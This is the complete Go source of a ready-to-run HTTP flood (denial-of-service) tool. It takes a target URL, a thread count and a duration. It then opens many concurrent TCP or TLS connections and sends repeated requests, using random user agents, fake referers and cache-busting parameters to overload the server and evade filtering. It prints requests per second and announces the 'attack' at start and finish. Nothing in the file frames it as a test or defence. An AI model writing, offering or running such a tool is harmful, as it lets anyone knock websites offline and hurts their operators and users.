package main

import (
	"bufio"
	"crypto/tls"
	"flag"
	"fmt"
	"math/rand"
	"net"
	"net/url"
	"os"
	"strconv"
	"strings"
	"sync/atomic"
	"time"
)

var requestCount uint64

var (
	referers = []string{
		"https://www.google.com/search?q=",
		"https://www.facebook.com/",
		"https://www.youtube.com/",
		"https://www.bing.com/search?q=",
		"https://vk.com/profile.php?auto=",
		"https://help.baidu.com/searchResult?keywords=",
	}
	acceptHeaders = []string{
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
		"Accept-Encoding: gzip, deflate",
		"Accept-Language: en-US,en;q=0.5",
	}
)

func getUserAgent() string {
	agents := []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/113.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/110.0.0.0 Safari/537.36",
	}
	return agents[rand.Intn(len(agents))]
}

func buildRequest(method, host, path string, advanced bool) string {
	var querySuffix string
	if strings.Contains(path, "?") {
		querySuffix = "&"
	} else {
		querySuffix = "?"
	}
	randomParam := fmt.Sprintf("%sq=%d", querySuffix, rand.Intn(100000))
	if advanced {
		path += randomParam
	}

	headers := []string{
		fmt.Sprintf("%s %s HTTP/1.1", method, path),
		fmt.Sprintf("Host: %s", host),
		"Connection: keep-alive",
		"Cache-Control: no-cache",
		fmt.Sprintf("User-Agent: %s", getUserAgent()),
	}

	if advanced {
		headers = append(headers, acceptHeaders[rand.Intn(len(acceptHeaders))])
		headers = append(headers, "Referer: "+referers[rand.Intn(len(referers))]+strconv.Itoa(rand.Intn(999999)))
	}

	headers = append(headers, "\r\n")
	return strings.Join(headers, "\r\n")
}

func attack(addr, host, path, method string, useTLS, advanced bool, stop <-chan struct{}) {
	for {
		select {
		case <-stop:
			return
		default:
			var conn net.Conn
			var err error

			if useTLS {
				conn, err = tls.Dial("tcp", addr, &tls.Config{InsecureSkipVerify: true})
			} else {
				conn, err = net.Dial("tcp", addr)
			}
			if err != nil {
				continue
			}

			req := buildRequest(method, host, path, advanced)
			for i := 0; i < 10; i++ {
				_, err := conn.Write([]byte(req))
				if err != nil {
					break
				}
				atomic.AddUint64(&requestCount, 1)
			}
			conn.Close()
		}
	}
}

func main() {
	advanced := flag.Bool("a", false, "Enable advanced headers and referers")
	flag.Parse()

	args := flag.Args()
	if len(args) != 4 {
		fmt.Println("Usage:", os.Args[0], "[flags] <url> <threads> <get/post> <seconds>")
		os.Exit(1)
	}

	targetURL := args[0]
	threads, _ := strconv.Atoi(args[1])
	method := strings.ToUpper(args[2])
	duration, _ := strconv.Atoi(args[3])

	u, err := url.Parse(targetURL)
	if err != nil {
		fmt.Println("Invalid URL")
		os.Exit(1)
	}

	host := u.Hostname()
	port := u.Port()
	if port == "" {
		if u.Scheme == "https" {
			port = "443"
		} else {
			port = "80"
		}
	}
	addr := host + ":" + port
	path := u.RequestURI()
	useTLS := u.Scheme == "https"

	stop := make(chan struct{})

	fmt.Printf("Starting attack on %s with %d goroutines for %d seconds...\n", host, threads, duration)
	for i := 0; i < threads; i++ {
		go attack(addr, host, path, method, useTLS, *advanced, stop)
	}

	go func() {
		ticker := time.NewTicker(time.Second)
		defer ticker.Stop()
		for {
			select {
			case <-stop:
				return
			case <-ticker.C:
				rps := atomic.SwapUint64(&requestCount, 0)
				fmt.Printf("RPS: %d\n", rps)
			}
		}
	}()

	time.Sleep(time.Duration(duration) * time.Second)
	close(stop)
	fmt.Println("Attack finished.")
}
